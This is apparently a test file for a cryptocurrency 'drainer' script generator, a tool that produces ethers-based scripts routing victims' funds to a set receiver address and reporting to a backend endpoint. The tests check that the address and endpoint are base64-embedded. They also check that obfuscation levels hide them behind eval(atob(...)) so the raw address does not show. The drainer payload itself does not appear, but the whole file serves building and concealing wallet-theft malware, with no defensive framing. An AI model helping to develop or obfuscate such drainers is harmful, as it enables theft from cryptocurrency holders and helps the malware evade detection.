import { generateDrainerScript } from '@/lib/drainer-script-generator';
import { describe, it, expect } from 'vitest';

describe('drainer-script-generator', () => {
  const testAddr = '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18';
  const b64Addr = Buffer.from(testAddr).toString('base64');
  const testBackend = '/api/submit-drainer';
  const b64Backend = Buffer.from(testBackend).toString('base64');

  it('embeds receiver and backend as base64 (even with no obfuscation)', () => {
    const script = generateDrainerScript({
      receiver: testAddr,
      backend: testBackend,
      obfuscation: 'none',
    });
    // The module always B64-encodes inside atob() calls
    expect(script).toContain(b64Addr);
    expect(script).toContain(b64Backend);
    expect(script).toContain('function');
    expect(script).toContain('ethers');
  });

  it('wraps in eval(atob when using medium obfuscation', () => {
    const script = generateDrainerScript({
      receiver: testAddr,
      backend: testBackend,
      obfuscation: 'medium',
    });
    expect(script).toContain('eval(atob(');
    expect(script).toContain('atob(');
    // Raw address not visible when medium obfuscation wraps in eval
    expect(script).not.toContain(testAddr);
  });

  it('does not contain broken variableName eval pattern', () => {
    const script = generateDrainerScript({ obfuscation: 'heavy' });
    expect(script).not.toContain('eval(atob(variableName))');
  });
});